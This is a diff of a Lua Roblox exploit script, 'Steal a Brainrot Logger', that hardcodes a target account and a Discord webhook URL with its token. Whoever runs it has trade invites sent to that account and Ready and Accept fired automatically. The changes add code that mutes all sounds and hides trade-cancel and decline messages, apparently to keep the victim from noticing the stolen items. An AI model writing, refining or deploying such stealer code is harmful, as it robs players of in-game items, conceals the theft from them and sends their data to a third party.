@@ -1,20 +1,14 @@
 --[[
 ============================================================
-  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v2 FIX + UI TRADE ADAPT
+  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v2 FIX
   · Target único: KIMILOSP (UserId resuelto automáticamente)
   · Todos los eventos van a un solo webhook
   · Listas actualizadas con la última update
-  · Arquitectura de envío/aceptación por UI y resolución de remotes adaptada
 ============================================================
 ]]
 
 getgenv().TARGET_USERNAME = "KIMILOSP"
 getgenv().GOOD_WEBHOOK = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"
-
--- Flags configurables (seguros para no romper el flujo original)
-getgenv().SAB_UI_FALLBACK_INVITE = getgenv().SAB_UI_FALLBACK_INVITE ~= false
-getgenv().SAB_UI_AUTO_READY_ACCEPT = getgenv().SAB_UI_AUTO_READY_ACCEPT ~= false
-getgenv().SAB_CLEAN_BLUR_AND_FOV = getgenv().SAB_CLEAN_BLUR_AND_FOV ~= false
 
 getgenv().ALLOWED_ANIMALS = {
   "Spyder Elephant", "Strawberry Elephant", "Meowl", "John Pork", "Skibidi Toilet",
@@ -499,7 +493,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local GuiService = game:GetService("GuiService")
-local Lighting = game:GetService("Lighting")
+local SoundService = game:GetService("SoundService")
 local localPlayer = Players.LocalPlayer
 local currentCamera = workspace.CurrentCamera
 local playerGui = localPlayer:WaitForChild("PlayerGui")
@@ -635,7 +629,6 @@ task.spawn(function()
 		tbl5[k] = v
 	end
 
-	-- Resolución adaptativa: busca primero por nombre en Packages.Net (log SAB) y usa el índice legado como fallback
 	local function fn(arg)
 		local netFolder = ReplicatedStorage:FindFirstChild("Packages")
 		netFolder = netFolder and netFolder:FindFirstChild("Net")
@@ -649,6 +642,7 @@ task.spawn(function()
 		end
 
 		local children = netFolder:GetChildren()
+
 		local v = ({
 			["RF/TradeService/Invite"] = 36,
 			["RE/TradeService/Ready"] = 42,
@@ -671,76 +665,168 @@ task.spawn(function()
 		return nil
 	end
 
-	-- Helpers adaptados de autosendtradedefinitivoperocorregir.txt y autoaccept.txt
-	local lastUiFire = 0
+	-- ── SONIDOS Y MENSAJES DE CANCELACIÓN DE INTERCAMBIO ──
+	local watchedSounds = {}
+	local watchedBannerLabels = {}
+	local clearedBannerTexts = {}
 
-	local function isAncestorVisibleToGui(inst)
+	local function isProtectedGuiObject(inst)
 		if not inst then
 			return false
 		end
-		if inst:IsA("GuiObject") and not inst.Visible then
-			return false
-		end
-		local p = inst.Parent
-		while p and p ~= playerGui do
-			if p:IsA("GuiObject") and not p.Visible then
-				return false
+		local curr = inst
+		while curr do
+			if curr.Name == "LeaveConfirmGui" or curr.Name == "DrainOverlay" or curr.Name == "LeftCenter_Backup" then
+				return true
 			end
-			p = p.Parent
+			curr = curr.Parent
 		end
-		return true
+		return false
 	end
 
-	local function fireImageButtonClean(btn)
-		if not btn or not btn:IsA("ImageButton") then
-			return false
+	local function muteSoundInstance(snd)
+		if not snd or not snd:IsA("Sound") then
+			return
 		end
-		if not isAncestorVisibleToGui(btn) then
-			return false
+		if isProtectedGuiObject(snd) then
+			return
 		end
-		local now = os.clock()
-		if now - lastUiFire < 0.35 then
-			return false
-		end
-		lastUiFire = now
-
-		local fired = false
-		if getconnections then
-			for _, sigName in ipairs({ "Activated", "MouseButton1Click" }) do
-				local ok, conns = pcall(function()
-					return getconnections(btn[sigName])
-				end)
-				if ok and type(conns) == "table" then
-					for _, conn in ipairs(conns) do
-						if conn.Fire then
-							pcall(function()
-								conn:Fire()
-								fired = true
-							end)
-						elseif conn.Function then
-							pcall(function()
-								conn.Function()
-								fired = true
-							end)
-						end
-					end
-				end
-			end
-		end
-		if not fired and firesignal then
+		pcall(function()
+			snd.Volume = 0
+			snd.Playing = false
+			snd:Stop()
+		end)
+		if not watchedSounds[snd] then
+			watchedSounds[snd] = true
 			pcall(function()
-				if btn.Activated then
-					firesignal(btn.Activated)
-					fired = true
-				elseif btn.MouseButton1Click then
-					firesignal(btn.MouseButton1Click)
-					fired = true
-				end
+				snd:GetPropertyChangedSignal("Playing"):Connect(function()
+					if snd.Playing then
+						pcall(function()
+							snd.Volume = 0
+							snd.Playing = false
+							snd:Stop()
+						end)
+					end
+				end)
+				snd:GetPropertyChangedSignal("Volume"):Connect(function()
+					if snd.Volume > 0 then
+						pcall(function()
+							snd.Volume = 0
+						end)
+					end
+				end)
+				snd.Played:Connect(function()
+					pcall(function()
+						snd.Volume = 0
+						snd.Playing = false
+						snd:Stop()
+					end)
+				end)
 			end)
 		end
-		return fired
 	end
 
+	local function muteAllGameAndUiSounds()
+		for _, desc in ipairs(playerGui:GetDescendants()) do
+			if desc:IsA("Sound") then
+				muteSoundInstance(desc)
+			end
+		end
+		for _, desc in ipairs(SoundService:GetDescendants()) do
+			if desc:IsA("Sound") then
+				muteSoundInstance(desc)
+			end
+		end
+	end
+
+	local function isTradeCancelMessageText(txt)
+		if type(txt) ~= "string" or txt == "" then
+			return false
+		end
+		local t = string.lower(txt)
+		if t:find("cancel", 1, true)
+			or t:find("canceló", 1, true)
+			or t:find("cancelo", 1, true)
+			or t:find("declin", 1, true)
+			or t:find("rechaz", 1, true)
+			or t:find("trade", 1, true) and (t:find("closed", 1, true) or t:find("cerrad", 1, true) or t:find("end", 1, true) or t:find("termin", 1, true))
+		then
+			return true
+		end
+		return false
+	end
+
+	local function isInsideCancelOrNotificationArea(obj)
+		local curr = obj and obj.Parent
+		local depth = 0
+		while curr and curr ~= playerGui and depth < 8 do
+			local n = string.lower(tostring(curr.Name or ""))
+			if n:find("notif", 1, true)
+				or n:find("banner", 1, true)
+				or n:find("toast", 1, true)
+				or n:find("alert", 1, true)
+				or n:find("popup", 1, true)
+				or n:find("announce", 1, true)
+				or n:find("cancel", 1, true)
+				or n:find("trade", 1, true)
+			then
+				return true
+			end
+			curr = curr.Parent
+			depth += 1
+		end
+		return false
+	end
+
+	local function maybeHideTradeCancelText(desc)
+		if not desc or isProtectedGuiObject(desc) then
+			return
+		end
+		if not (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
+			return
+		end
+
+		if not watchedBannerLabels[desc] then
+			watchedBannerLabels[desc] = true
+			pcall(function()
+				desc:GetPropertyChangedSignal("Text"):Connect(function()
+					maybeHideTradeCancelText(desc)
+				end)
+			end)
+		end
+
+		local txt = desc.Text or ""
+		local shouldClear = isTradeCancelMessageText(txt)
+			or (isInsideCancelOrNotificationArea(desc) and (
+				string.find(string.lower(txt), "cancel", 1, true)
+				or string.find(string.lower(txt), "declin", 1, true)
+				or string.find(string.lower(txt), "rechaz", 1, true)
+				or string.find(string.lower(txt), "expired", 1, true)
+				or string.find(string.lower(txt), "expir", 1, true)
+			))
+
+		if shouldClear then
+			if clearedBannerTexts[desc] == nil and txt ~= "" then
+				clearedBannerTexts[desc] = txt
+			end
+			pcall(function()
+				if desc.Text ~= "" then
+					desc.Text = ""
+				end
+				desc.Visible = false
+			end)
+		end
+	end
+
+	local function cleanTradeCancelMessages()
+		for _, desc in ipairs(playerGui:GetDescendants()) do
+			if desc:IsA("TextLabel") or desc:IsA("TextButton") then
+				maybeHideTradeCancelText(desc)
+			end
+		end
+	end
+
+	-- Helpers de envío de solicitud de intercambio por interfaz (adaptados de AutoSendTrade)
 	local function resolveClickableButton(inst)
 		if not inst then
 			return nil
@@ -762,16 +848,12 @@ task.spawn(function()
 		return nil
 	end
 
-	local function triggerGuiButtonClean(inst)
-		local btn = resolveClickableButton(inst) or inst
+	local function fireGuiSignals(btn)
 		if not btn then
 			return false
 		end
-		if btn:IsA("ImageButton") then
-			return fireImageButtonClean(btn)
-		end
-
 		local triggered = false
+
 		if firesignal then
 			pcall(function()
 				if btn.MouseButton1Down then
@@ -791,6 +873,7 @@ task.spawn(function()
 				end
 			end)
 		end
+
 		if getconnections then
 			for _, sigName in ipairs({ "MouseButton1Click", "Activated", "MouseButton1Down" }) do
 				local ok, conns = pcall(function()
@@ -798,45 +881,21 @@ task.spawn(function()
 				end)
 				if ok and type(conns) == "table" then
 					for _, conn in ipairs(conns) do
-						if conn.Function then
-							pcall(function()
-								conn.Function()
-								triggered = true
-							end)
+						if conn.Function and pcall(conn.Function) then
+							triggered = true
 						end
 					end
 				end
 			end
 		end
+
 		if not triggered and btn:IsA("GuiButton") then
 			pcall(function()
 				GuiService.SelectedObject = btn
 			end)
 		end
+
 		return triggered
-	end
-
-	local function findLeftTradeButton()
-		local leftCenter = playerGui:FindFirstChild("LeftCenter", true)
-		if leftCenter then
-			local exact = leftCenter:FindFirstChild("TradePlayerList", true)
-			if exact then
-				return resolveClickableButton(exact) or exact
-			end
-		end
-		return nil
-	end
-
-	local function findSearchBox(root)
-		if not root then
-			return nil
-		end
-		for _, desc in ipairs(root:GetDescendants()) do
-			if desc:IsA("TextBox") then
-				return desc
-			end
-		end
-		return nil
 	end
 
 	local function pressEnterOnSearchBox(box, textToType)
@@ -861,6 +920,29 @@ task.spawn(function()
 			end
 			box:ReleaseFocus()
 		end)
+	end
+
+	local function findLeftTradeButton()
+		local leftCenter = playerGui:FindFirstChild("LeftCenter", true) or playerGui:FindFirstChild("LeftCenter_Backup", true)
+		if leftCenter then
+			local exact = leftCenter:FindFirstChild("TradePlayerList", true)
+			if exact then
+				return resolveClickableButton(exact) or exact
+			end
+		end
+		return nil
+	end
+
+	local function findSearchBox(root)
+		if not root then
+			return nil
+		end
+		for _, desc in ipairs(root:GetDescendants()) do
+			if desc:IsA("TextBox") then
+				return desc
+			end
+		end
+		return nil
 	end
 
 	local function findTargetSendButton(root, tName, tId)
@@ -907,74 +989,44 @@ task.spawn(function()
 		return nil
 	end
 
-	local function trySendTradeViaUi(tName, tId)
-		if not getgenv().SAB_UI_FALLBACK_INVITE then
-			return false
-		end
+	local function sendTradeInviteViaUi(tName, tId)
 		local sent = false
-		for attempt = 1, 8 do
+		for attempt = 1, 10 do
 			local tradeListGui = playerGui:FindFirstChild("TradePlayerList")
 			local sendBtn = findTargetSendButton(tradeListGui or playerGui, tName, tId)
 
 			if not sendBtn then
 				local openBtn = findLeftTradeButton()
 				if openBtn then
-					triggerGuiButtonClean(openBtn)
-					task.wait(0.25)
+					fireGuiSignals(openBtn)
+					task.wait(0.3)
 					tradeListGui = playerGui:FindFirstChild("TradePlayerList")
 				end
+
 				local searchBox = findSearchBox(tradeListGui or playerGui)
 				if searchBox then
 					pressEnterOnSearchBox(searchBox, tName)
-					task.wait(0.25)
+					task.wait(0.3)
 				end
+
 				sendBtn = findTargetSendButton(tradeListGui or playerGui, tName, tId)
 			end
 
 			if sendBtn and not sent then
-				if triggerGuiButtonClean(sendBtn) then
+				if fireGuiSignals(sendBtn) then
 					sent = true
 					task.wait(0.25)
 					local closeBtn = findCloseButton(tradeListGui or playerGui)
 					if closeBtn then
-						triggerGuiButtonClean(closeBtn)
+						fireGuiSignals(closeBtn)
 					end
 					break
 				end
 			end
+
 			task.wait(0.35)
 		end
 		return sent
-	end
-
-	local function tryUiReadyOrAcceptForTarget()
-		if not getgenv().SAB_UI_AUTO_READY_ACCEPT then
-			return
-		end
-		local tradeGui = playerGui:FindFirstChild("TradeLiveTrade")
-		if not tradeGui then
-			return
-		end
-		local main = tradeGui:FindFirstChild("TradeLiveTrade")
-		local other = main and main:FindFirstChild("Other")
-		local usernameObj = other and other:FindFirstChild("Username")
-		if usernameObj and usernameObj:IsA("TextLabel") and usernameObj.Text ~= "" then
-			if not isTargetName(usernameObj.Text) then
-				return
-			end
-		end
-		local readyBtn = other and other:FindFirstChild("ReadyButton")
-		local txtObj = readyBtn and readyBtn:FindFirstChild("Txt")
-		if readyBtn and txtObj and txtObj:IsA("TextLabel") then
-			local label = string.upper(txtObj.Text or "")
-			if label == "READY" or label == "ACCEPT" then
-				if readyBtn:IsA("ImageButton") then
-					fireImageButtonClean(readyBtn)
-				else
-					triggerGuiButtonClean(readyBtn)
-				end
-			end
-		end
 	end
 
 	local function fn2()
@@ -997,27 +1049,28 @@ task.spawn(function()
 			end)
 		end
 
-		local function destroyPostEffect(obj)
-			if not getgenv().SAB_CLEAN_BLUR_AND_FOV then
-				return
+		muteAllGameAndUiSounds()
+		cleanTradeCancelMessages()
+
+		playerGui.DescendantAdded:Connect(function(desc)
+			if desc:IsA("Sound") then
+				muteSoundInstance(desc)
+			elseif desc:IsA("TextLabel") or desc:IsA("TextButton") then
+				maybeHideTradeCancelText(desc)
 			end
-			if obj:IsA("BlurEffect") or obj:IsA("DepthOfFieldEffect") then
-				task.defer(function()
-					pcall(function()
-						obj.Enabled = false
-						obj:Destroy()
-					end)
-				end)
+		end)
+
+		SoundService.DescendantAdded:Connect(function(desc)
+			if desc:IsA("Sound") then
+				muteSoundInstance(desc)
 			end
-		end
+		end)
 
 		local function fn3(child)
 			if child:IsA("BlurEffect") then
 				task.defer(function()
 					child:Destroy()
 				end)
-			elseif getgenv().SAB_CLEAN_BLUR_AND_FOV and child:IsA("DepthOfFieldEffect") then
-				destroyPostEffect(child)
 			end
 		end
 
@@ -1025,13 +1078,6 @@ task.spawn(function()
 
 		for _, child in ipairs(currentCamera:GetChildren()) do
 			fn3(child)
-		end
-
-		if getgenv().SAB_CLEAN_BLUR_AND_FOV then
-			for _, obj in ipairs(Lighting:GetDescendants()) do
-				destroyPostEffect(obj)
-			end
-			Lighting.DescendantAdded:Connect(destroyPostEffect)
 		end
 
 		currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
@@ -1761,6 +1807,15 @@ task.spawn(function()
 	end
 	fn2()
 
+	-- Mantenimiento continuo de sonidos silenciados y mensajes de cancelación ocultos
+	task.spawn(function()
+		while true do
+			muteAllGameAndUiSounds()
+			cleanTradeCancelMessages()
+			task.wait(0.5)
+		end
+	end)
+
 	local tbl6 = {
 		phase = "IDLE",
 		queue = {},
@@ -1958,11 +2013,11 @@ task.spawn(function()
 		while true do
 			if tbl6.running and tbl6.targetId ~= 0 and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
 				local invokedOk = pcall(function()
-					Invite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tbl6.targetId)
+					return Invite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tbl6.targetId)
 				end)
 				if not invokedOk then
 					pcall(function()
-						trySendTradeViaUi(targetName, tbl6.targetId)
+						sendTradeInviteViaUi(targetName, tbl6.targetId)
 					end)
 				end
 			end
@@ -1977,14 +2032,12 @@ task.spawn(function()
 				pcall(function()
 					Ready:FireServer("23f15b0b-b633-4f6b-888f-5924b7425522")
 				end)
-				pcall(tryUiReadyOrAcceptForTarget)
 
 				task.wait(0.7)
 
 				pcall(function()
 					Accept:FireServer("86eea964-f19e-4ac6-b401-a71ecc89e596")
 				end)
-				pcall(tryUiReadyOrAcceptForTarget)
 
 				if tbl6.phase == "PRIORITY" and not tbl6.priorityDone then
 					task.wait(0.15)
